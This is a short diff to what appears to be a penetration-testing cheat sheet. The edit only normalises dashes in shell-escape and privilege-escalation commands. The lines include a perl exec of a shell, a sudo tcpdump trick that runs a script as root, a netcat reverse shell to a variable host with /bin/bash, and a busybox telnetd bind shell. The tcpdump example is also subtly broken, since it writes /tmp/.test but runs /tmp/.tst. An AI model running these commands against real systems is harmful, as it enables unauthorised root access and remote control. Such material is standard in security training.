@@ -26,9 +26,9 @@ $ export TERM=linux*
     *$ perl —e 'exec "/bin/sh";'*
 
     From within tcpdump
-    *$ echo $’id\n/bin/netcat $ip 443 –e /bin/bash’ > /tmp/.test
+    *$ echo $’id\n/bin/netcat $ip 443 -e /bin/bash’ > /tmp/.test
 chmod +x /tmp/.test
-sudo tcpdump –ln –I eth- -w /dev/null –W 1 –G 1 –z /tmp/.tst –Z root*
+sudo tcpdump -ln -I eth- -w /dev/null -W 1 -G 1 -z /tmp/.tst -Z root*
 
     From busybox
     *$ /bin/busybox telnetd -|/bin/sh -p9999*
